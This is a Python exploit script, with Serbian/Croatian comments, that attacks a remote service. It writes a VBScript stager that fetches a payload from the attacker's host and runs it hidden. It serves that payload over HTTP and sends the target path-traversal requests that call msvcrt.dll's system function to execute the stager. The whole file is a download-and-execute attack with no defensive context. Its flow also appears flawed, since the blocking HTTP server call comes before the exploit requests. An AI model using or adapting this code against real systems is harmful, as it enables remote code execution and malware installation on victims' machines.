import argparse
import requests
import sys
import os

# Parsovanje
parser = argparse.ArgumentParser()
parser.add_argument("rhost", help="Target IP address")
parser.add_argument("rport", type=int, help="Target port")
parser.add_argument("lhost", help="Local IP address")
parser.add_argument("lport", type=int, help="Local port")
parser.add_argument("payload_name", help="Name of the payload file")
parser.add_argument("stager_name", help="Name of the stager file")
parser.add_argument("temp_folder", help="Path to the temporary folder")
args = parser.parse_args()

# konfig
rhost = args.rhost
rport = args.rport
lhost = args.lhost
lport = args.lport
payload_name = args.payload_name
stager_name = args.stager_name
temp_folder = args.temp_folder

# VBS stager
stager = """
Set objXMLHTTP = CreateObject("Microsoft.XMLHTTP")
objXMLHTTP.open "GET", "http://{lhost}:{lport}/{payload_name}", False
objXMLHTTP.send()

Set objADODB = CreateObject("ADODB.Stream")
objADODB.Open
objADODB.Type = 1
objADODB.Write objXMLHTTP.responseBody
objADODB.SaveToFile "{temp_folder}\{payload_name}", 2
CreateObject("WScript.Shell").Run "{temp_folder}\{payload_name}", 0
""".format(lhost=lhost, lport=lport, payload_name=payload_name, temp_folder=temp_folder)

with open(stager_name, "w") as f:
    f.write(stager)

# HTTP server na LHOST i LPORT
os.system(f"python -m http.server {lport}")

# Konektovanje na target i transfer exploita
s = requests.Session()
s.get(f"http://{rhost}:{rport}/")

createvbs = f"xf%..\\..\\..\\..\\..\\windows\\system32\\msvcrt.dll,system,cmd /c {stager_name}\r\n"
download_execute = f"xf%..\\..\\..\\..\\..\\windows\\system32\\msvcrt.dll,system,start {temp_folder}\\{stager_name}\r\n"

s.post(f"http://{rhost}:{rport}/", data=createvbs)
s.post(f"http://{rhost}:{rport}/", data=download_execute)

# Cleanup stagera
os.remove(stager_name)
